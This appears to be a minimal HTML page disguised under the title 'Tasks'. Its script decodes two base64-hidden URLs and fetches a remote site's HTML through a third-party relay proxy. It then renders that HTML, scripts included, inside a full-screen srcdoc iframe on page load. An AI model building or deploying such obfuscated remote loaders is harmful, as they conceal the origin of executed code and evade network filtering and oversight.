<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Tasks</title>
<style>
html, body {
  margin: 0;
  padding: 0;
  height: 100%;
  overflow: hidden;
  background: #111;
  color: #fff;
  font-family: sans-serif;
}
#x1 {
  width: 100%;
  height: 100%;
  border: none;
}
#x2 {
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
}
</style>
</head>
<body>
<div id="x2">Loading...</div>
<iframe id="x1"></iframe>
<script>
(function() {
  function decodeBase64(str) {
    return decodeURIComponent(escape(atob(str)));
  }

  const encodedRelay = "aHR0cHM6Ly9sb2dpc3RpY2FsLXV0aWxpdGllcy52ZXJjZWwuYXBw";
  const encodedTarget = "aHR0cHM6Ly9jb3JlLWxvZ2ljLXV0aWxzLmdpdGh1Yi5pbw==";

  const relayBase = decodeBase64(encodedRelay);
  const targetOrigin = decodeBase64(encodedTarget);

  const proxyUrl = relayBase + "/api/relay?url=" + encodeURIComponent(targetOrigin);

  fetch(proxyUrl)
    .then(function(response) {
      if (!response.ok) throw new Error("fetch failed");
      return response.text();
    })
    .then(function(html) {
      document.getElementById("x2").style.display = "none";
        
      // Inject base tag ONLY so relative links on the main dashboard resolve correctly
      let processed = html;
      const baseTag = '<base href="' + targetOrigin + '/">';
      if (processed.toLowerCase().includes('<head>')) {
        processed = processed.replace(/<head>/i, '<head>\n' + baseTag);
      } else {
        processed = baseTag + '\n' + processed;
      }

      document.getElementById("x1").srcdoc = processed;
    })
    .catch(function(err) {
      console.log("error", err);
      document.getElementById("x2").innerText = "Failed.";
    });
})();
</script>
</body>
</html>
